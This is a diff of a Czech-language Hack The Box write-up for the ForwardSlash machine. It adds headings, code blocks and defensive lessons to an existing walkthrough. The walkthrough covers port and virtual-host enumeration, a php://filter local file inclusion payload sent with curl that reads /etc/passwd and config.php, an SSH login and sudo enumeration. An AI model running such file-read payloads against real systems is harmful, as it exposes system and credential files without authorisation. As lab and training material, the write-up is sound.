@@ -5,15 +5,26 @@ title: "ForwardSlash"
 date: 2020-11-29
 tags: linux lfi rce ssh sudo php
 ---
-[ForwardSlash](https://www.hackthebox.eu/home/machines/profile/239) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.
+
+## Úvod a kontext
+
+ForwardSlash je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-Nejdřív mapuji služby, které jsou dostupné zvenku.
-`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
 
-### Přihlášení na cíl
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+```bash
+ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
+```
+
+### Detailní analýza služeb
+
+V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
+```text
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+```
 ```
 | ssh-hostkey:
 |   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
@@ -28,15 +39,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Enumerace webu
-Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
-`dirb http://forwardslash.htb -X ,.php,.txt,.log,.xml`
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+dirb http://forwardslash.htb -X ,.php,.txt,.log,.xml
+```
 ```
 => + http://forwardslash.htb/note.txt (CODE:200|SIZE:216)
 ```
 
 ### Enumerace webu (2)
-Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
-`wfuzz -H "Host: FUZZ.forwardslash.htb" -w /usr/share/wordlists/wfuzz/general/common.txt --hh 0 http://$IP`
+
+Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
+```bash
+wfuzz -H "Host: FUZZ.forwardslash.htb" -w /usr/share/wordlists/wfuzz/general/common.txt --hh 0 http://$IP
+```
 ```
 => backup.forwardslash.htb
 
@@ -44,9 +61,14 @@ Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní strá
 => http://backup.forwardslash.htb/dev/
 ```
 
+## Získání přístupu
+
 ### Spuštění exploitu
-Zde dochází k praktickému zneužití zranitelnosti.
-`curl -F "url=php://filter/convert.base64-encode/resource=/etc/passwd" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```bash
+curl -F "url=php://filter/convert.base64-encode/resource=/etc/passwd" -H "Cookie: PHPSESSID=tt2u04m6a1pb9vavplb2e88vvt;" http://backup.forwardslash.htb/api.php | base64 -d -
+```
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -79,23 +101,37 @@ pollinate:x:109:1::/var/cache/pollinate:/bin/false
 ```
 
 ### Spuštění exploitu (2)
-Zde dochází k praktickému zneužití zranitelnosti.
-`php://filter/convert.base64-encode/resource=config.php`
+
+V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
+```bash
+php://filter/convert.base64-encode/resource=config.php
+```
 
 ### Přihlášení na cíl (2)
-Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
-`ssh chiv@forwardslash.htb`
+
+Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+```bash
+ssh chiv@forwardslash.htb
+```
 
 ### Získání user flagu
-Tímto potvrzuji úspěšný uživatelský přístup.
-`cat user.txt`
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+```bash
+cat user.txt
+```
 ```
 __CENSORED__
 ```
 
+## Eskalace oprávnění
+
 ### Průzkum možností eskalace
+
 Hledám chybné konfigurace a cesty k vyšším oprávněním.
-`sudo -l`
+```bash
+sudo -l
+```
 ```
     (root) NOPASSWD: __CENSORED__ luksOpen *
     (root) NOPASSWD: __CENSORED__ /dev/mapper/backup ./mnt/
@@ -103,8 +139,24 @@ Hledám chybné konfigurace a cesty k vyšším oprávněním.
 ```
 
 ### Získání root flagu
-Tímto potvrzuji úplné ovládnutí stroje.
-`cat root.txt`
+
+Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+```bash
+cat root.txt
+```
 ```
 __CENSORED__
 ```
+
+## Shrnutí klíčových poznatků
+
+- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
+- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
+- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.
+
+## Co si odnést do praxe
+
+- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
+- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
+- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
+- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
